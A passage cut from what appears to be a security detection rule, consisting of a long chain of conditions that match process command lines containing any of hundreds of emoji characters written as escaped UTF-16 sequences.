'\ud83d\udc6a' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83d\udde3' || evt.Parsed.CommandLine contains '\ud83d\udc64' || evt.Parsed.CommandLine contains '\ud83d\udc65' || evt.Parsed.CommandLine contains '\ud83e\udec2' || evt.Parsed.CommandLine contains '\ud83e\uddf3' || evt.Parsed.CommandLine contains '\ud83c\udf02' || evt.Parsed.CommandLine contains '\u2602\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddf5' || evt.Parsed.CommandLine contains '\ud83e\udea1' || evt.Parsed.CommandLine contains '\ud83e\udea2' || evt.Parsed.CommandLine contains '\ud83e\uddf6' || evt.Parsed.CommandLine contains '\ud83d\udc53' || evt.Parsed.CommandLine contains '\ud83d\udd76' || evt.Parsed.CommandLine contains '\ud83e\udd7d' || evt.Parsed.CommandLine contains '\ud83e\udd7c' || evt.Parsed.CommandLine contains '\ud83e\uddba' || evt.Parsed.CommandLine contains '\ud83d\udc54' || evt.Parsed.CommandLine contains '\ud83d\udc55' || evt.Parsed.CommandLine contains '\ud83d\udc56' || evt.Parsed.CommandLine contains '\ud83e\udde3' || evt.Parsed.CommandLine contains '\ud83e\udde4' || evt.Parsed.CommandLine contains '\ud83e\udde5' || evt.Parsed.CommandLine contains '\ud83e\udde6' || evt.Parsed.CommandLine contains '\ud83d\udc57' || evt.Parsed.CommandLine contains '\ud83d\udc58' || evt.Parsed.CommandLine contains '\ud83e\udd7b' || evt.Parsed.CommandLine contains '\ud83e\ude74' || evt.Parsed.CommandLine contains '\ud83e\ude71' || evt.Parsed.CommandLine contains '\ud83e\ude72' || evt.Parsed.CommandLine contains '\ud83e\ude73' || evt.Parsed.CommandLine contains '\ud83d\udc59' || evt.Parsed.CommandLine contains '\ud83d\udc5a' || evt.Parsed.CommandLine contains '\ud83d\udc5b' || evt.Parsed.CommandLine contains '\ud83d\udc5c' || evt.Parsed.CommandLine contains '\ud83d\udc5d' || evt.Parsed.CommandLine contains '\ud83c\udf92' || evt.Parsed.CommandLine contains '\ud83d\udc5e' || evt.Parsed.CommandLine contains '\ud83d\udc5f' || evt.Parsed.CommandLine contains '\ud83e\udd7e' || evt.Parsed.CommandLine contains '\ud83e\udd7f' || evt.Parsed.CommandLine contains '\ud83d\udc60' || evt.Parsed.CommandLine contains '\ud83d\udc61' || evt.Parsed.CommandLine contains '\ud83e\ude70' || evt.Parsed.CommandLine contains '\ud83d\udc62' || evt.Parsed.CommandLine contains '\ud83d\udc51' || evt.Parsed.CommandLine contains '\ud83d\udc52' || evt.Parsed.CommandLine contains '\ud83c\udfa9' || evt.Parsed.CommandLine contains '\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83e\udde2' || evt.Parsed.CommandLine contains '\u26d1' || evt.Parsed.CommandLine contains '\ud83e\ude96' || evt.Parsed.CommandLine contains '\ud83d\udc84' || evt.Parsed.CommandLine contains '\ud83d\udc8d' || evt.Parsed.CommandLine contains '\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc4b\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd1a\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udd90\ud83c\udffb' || evt.Parsed.CommandLine contains '\u270b\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udd96\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc4c\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd0c\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd0f\ud83c\udffb' || evt.Parsed.CommandLine contains '\u270c\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd1e\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd1f\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd18\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd19\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc48\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc49\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc46\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udd95\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc47\ud83c\udffb' || evt.Parsed.CommandLine contains '\u261d\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc4d\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc4e\ud83c\udffb' || evt.Parsed.CommandLine contains '\u270a\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc4a\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd1b\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd1c\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc4f\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude4c\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc50\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd32\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude4f\ud83c\udffb' || evt.Parsed.CommandLine contains '\u270d\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udcaa\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddb5\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddb6\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc42\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddbb\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc43\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc76\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc67\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc66\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc75\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd3\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc74\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc72\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd5\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc78\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd34\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd77\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd36\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf84' || evt.Parsed.CommandLine contains '\ud83c\udf85\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc7c\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd30\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd31\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc83\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udd7a\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udd74\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6d\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc6c\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc6b\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc7\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83c\udfc2\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffb' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains 